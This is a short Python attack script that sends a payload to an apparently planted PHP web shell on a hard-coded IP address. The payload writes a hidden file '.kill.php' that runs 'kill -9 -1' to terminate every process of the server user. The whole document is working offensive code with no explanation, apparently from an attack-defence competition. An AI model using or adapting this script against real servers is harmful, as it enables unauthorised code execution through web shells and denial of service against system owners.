import requests

url = "http://39.108.36.103:9999/upload/tinmin123.php"

php_code = '''
<?php
system(\\'kill -9 -1\\');
'''


payload = '''
file_put_contents(\'.kill.php\','%s');
'''%php_code

#print(payload)
r = requests.post(url,data={'tinmin':payload})